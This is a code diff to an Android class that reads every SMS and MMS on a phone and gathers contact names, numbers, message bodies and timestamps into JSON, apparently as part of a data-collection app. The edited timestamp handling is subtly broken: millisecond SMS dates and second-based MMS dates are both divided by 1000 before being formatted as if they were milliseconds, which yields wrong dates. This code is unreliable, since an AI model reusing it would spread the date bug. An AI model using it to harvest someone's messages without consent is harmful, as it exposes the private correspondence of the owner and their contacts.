@@ -5,6 +5,9 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.util.Log;
 
+import net.scottjulian.lateralus.Config;
+import net.scottjulian.lateralus.components.Utils;
+
 import org.json.JSONArray;
 import org.json.JSONObject;
 
@@ -13,11 +16,14 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.text.MessageFormat;
-import java.util.ArrayList;
-import java.util.Collections;
-import java.util.Comparator;
-import java.util.Iterator;
-import java.util.List;
+import java.text.SimpleDateFormat;
+//import java.util.ArrayList;
+//import java.util.Collections;
+//import java.util.Comparator;
+import java.util.Date;
+import java.util.Locale;
+//import java.util.Iterator;
+//import java.util.List;
 
 
 public class TextMessageReader extends DataReader {
@@ -48,6 +54,7 @@ public class TextMessageReader extends DataReader {
     public static final String KEY_BODY   = "body";
     public static final String KEY_TYPE   = "type";
     public static final String KEY_TS     = "timestamp";
+    public static final String KEY_TS_FORMATTED = "timestamp_formatted";
     public static final String KEY_SENT   = "sent";
 
     public TextMessageReader(Context ctx) {
@@ -68,7 +75,7 @@ public class TextMessageReader extends DataReader {
 
     @Override
     public String getRootKey() {
-        return null;
+        return ROOT_KEY;
     }
 
     //////// Helpers ////////
@@ -102,7 +109,8 @@ public class TextMessageReader extends DataReader {
                 }
             }
 
-            return sortMessagesByTimestamp(root);
+            //return sortMessagesByTimestamp(root);
+            return root;
         }
         catch(Exception e){
             Log.e(TAG, "Error sorting SMS/MMS by phone number!");
@@ -111,6 +119,7 @@ public class TextMessageReader extends DataReader {
         return null;
     }
 
+    /*
     private JSONObject sortMessagesByTimestamp(JSONObject messages){
         try {
             Iterator it = messages.keys();
@@ -159,6 +168,7 @@ public class TextMessageReader extends DataReader {
         }
         return messages;
     }
+    */
 
     //////// SMS ////////
 
@@ -166,17 +176,21 @@ public class TextMessageReader extends DataReader {
         JSONArray root = new JSONArray();
         try{
             Cursor cursor = _ctx.getContentResolver().query(Uri.parse(CONTENT_SMS), null, null, null, null);
+            SimpleDateFormat sdf = new SimpleDateFormat(Config.TIMESTAMP_FORMAT, Locale.ENGLISH);
             if(cursor.moveToFirst()) {
                 do {
                     String phoneNumber = cursor.getString(cursor.getColumnIndex(COL_ADDRESS));
-                    Boolean sent = (cursor.getInt(cursor.getColumnIndex(COL_TYPE)) == 2) ? true : false;
+                    Boolean sent = (cursor.getInt(cursor.getColumnIndex(COL_TYPE)) == 2);
+                    long ts = cursor.getLong(cursor.getColumnIndex(COL_DATE)) / 1000;
+                    String date = sdf.format(new Date(ts));
                     JSONObject textMsg = new JSONObject();
-                    textMsg.put(KEY_NAME,  ContactReader.getContactName(_ctx, phoneNumber));
-                    textMsg.put(KEY_NUMBER, PhonecallReader.parseNumber(phoneNumber));
+                    textMsg.put(KEY_NAME,  Utils.getContactName(_ctx, phoneNumber));
+                    textMsg.put(KEY_NUMBER, Utils.parsePhoneNumber(phoneNumber));
                     textMsg.put(KEY_BODY, cursor.getString(cursor.getColumnIndex(COL_BODY)));
                     textMsg.put(KEY_TYPE, "sms");
-                    textMsg.put(KEY_TS, cursor.getLong(cursor.getColumnIndex(COL_DATE)));
+                    textMsg.put(KEY_TS, ts);
                     textMsg.put(KEY_SENT, sent);
+                    textMsg.put(KEY_TS_FORMATTED, date);
                     root.put(textMsg);
                 }
                 while(cursor.moveToNext());
@@ -201,9 +215,10 @@ public class TextMessageReader extends DataReader {
             if(cursor.moveToFirst()) {
                 do {
                     String pid = cursor.getString(cursor.getColumnIndex(COL_ID));
-                    long timestamp = cursor.getLong(cursor.getColumnIndex(COL_DATE)) * 1000; // wtf google
-                    Boolean sent = (cursor.getString(cursor.getColumnIndex(COL_M_TYPE)).equals(M_TYPE_SENT)) ? true : false;
-                    JSONObject mms = extractMms(pid, timestamp, sent);
+                    //long timestamp = cursor.getLong(cursor.getColumnIndex(COL_DATE)) * 1000; // wtf google
+                    long ts = cursor.getLong(cursor.getColumnIndex(COL_DATE)) / 1000;
+                    Boolean sent = (cursor.getString(cursor.getColumnIndex(COL_M_TYPE)).equals(M_TYPE_SENT));
+                    JSONObject mms = extractMms(pid, ts, sent);
                     if(mms != null) {
                         root.put(mms);
                     }
@@ -224,8 +239,8 @@ public class TextMessageReader extends DataReader {
     private JSONObject extractMms(String pid, long timestamp, Boolean sent){
         String selectionPart = "mid=" + pid;
         Cursor cursor = _ctx.getContentResolver().query(Uri.parse(CONTENT_MMS_PART), null, selectionPart, null, null);
-        String number = PhonecallReader.parseNumber(getMmsAddress(pid));
-        String name = ContactReader.getContactName(_ctx, number);
+        String number = Utils.parsePhoneNumber(getMmsAddress(pid));
+        String name = Utils.getContactName(_ctx, number);
         String body = "";
 
         if (cursor.moveToFirst()) {
@@ -248,11 +263,14 @@ public class TextMessageReader extends DataReader {
         if(!number.isEmpty() && !body.isEmpty()) {
             JSONObject textMessage = new JSONObject();
             try{
+                SimpleDateFormat sdf = new SimpleDateFormat(Config.TIMESTAMP_FORMAT, Locale.ENGLISH);
+                String date = sdf.format(new Date(timestamp));
                 textMessage.put(KEY_NAME, name);
                 textMessage.put(KEY_NUMBER, number);
                 textMessage.put(KEY_BODY, body);
                 textMessage.put(KEY_TYPE, "mms");
                 textMessage.put(KEY_TS, timestamp);
+                textMessage.put(KEY_TS_FORMATTED, date);
                 textMessage.put(KEY_SENT, sent);
                 return textMessage;
             }
